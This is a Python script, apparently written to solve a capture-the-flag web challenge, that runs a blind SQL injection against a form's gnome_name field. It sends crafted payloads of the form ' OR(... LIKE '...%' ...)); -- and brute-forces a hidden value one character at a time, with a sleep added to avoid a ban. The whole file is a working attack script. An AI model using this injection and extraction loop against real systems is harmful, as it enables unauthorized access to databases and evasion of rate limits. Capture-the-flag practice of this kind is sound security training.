from urllib.parse import urlencode
from urllib.request import urlopen
import webbrowser
import tempfile
import time
import urllib.request
import urllib.error
import string

name = "Faith"
gnome = ""

characters = string.ascii_letters + string.digits
response_data = ""
test = ""
j=0
print("skill issue is starting.....")
while(j<30):
    gnome= gnome + 'a'
        
    for c in characters:
        gnome = gnome[:j] + c
        query = "random' OR(gnome_name LIKE '" + gnome + "%' AND assigned_name LIKE 'Faith%')); --"
        #query = "random' OR(assigned_name LIKE 'Faith%')); --"
        data = {
            "assigned_name": name,
            "gnome_name": query
        }
        
    
        encoded_data = urlencode(data).encode('utf-8')
        response = urlopen("https://web5.chall.necst.it/submit", encoded_data)
        response_data = response.read()
        
        if "<title>Success - Gnome Found!" in str(response_data): 
            print(gnome)
            j+=1
            break
    
        time.sleep(0.03) #avoid ban
            
    data = {
                "assigned_name": name,
                "gnome_name": gnome
    }

    encoded_data = urlencode(data).encode('utf-8')
    response = urlopen("https://web5.chall.necst.it/submit", encoded_data)
    response_data = response.read()

    #open output web page
    with tempfile.NamedTemporaryFile(delete=False, suffix='.html') as temp_file:
        temp_file.write(response_data)
        temp_file.flush()

    webbrowser.open(f'file://{temp_file.name}')

    if "<title>Success - Gnome Found!" in str(response_data): 
            print("!skill issue")
            break

print("wow!",gnome)


